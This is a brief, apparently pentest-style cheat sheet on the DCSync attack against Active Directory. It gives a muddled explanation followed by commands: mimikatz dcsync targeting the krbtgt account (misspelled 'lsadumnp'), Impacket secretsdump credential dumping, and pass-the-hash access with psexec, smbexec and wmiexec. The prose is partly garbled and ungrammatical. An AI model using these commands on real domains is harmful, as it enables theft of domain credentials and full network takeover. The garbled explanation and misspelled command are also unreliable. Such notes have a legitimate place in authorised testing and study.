Active Directory environments typically include multiple domain controllers, which needs to sync it could be simply a backup server. some applications, including Azure Active Directory Connect, need replication permissions. In a DCSync attack, a hacker who has gained access to a privileged account with grant a service account “Replicate Directory Changes All” this AD functionality by pretending to be a DC. DCSync is a mimikatz feature which will try to impersonate a domain controller and request account password information from the targeted domain controller


lsadump
```
lsadumnp::dcsync /domain:<domain_name> /user:krbtgt
```


secretsdump
```
secretsdump.py '<domain_name>'/'<domain_user>':'<domain_user_password>'@
'<domain_ip>'
```


**Access Account Methods**
psexec
```
psexec <domain_user>@<domain_ip> -hashes <user_hash>
```

OR

smbexec  
```
 smbexec <domain_user>@<domain_ip> -hashes <user_hash>
```

OR

wmiexec
```
wmiexec <domain_user>@<domain_ip> -hashes <user_hash>
```

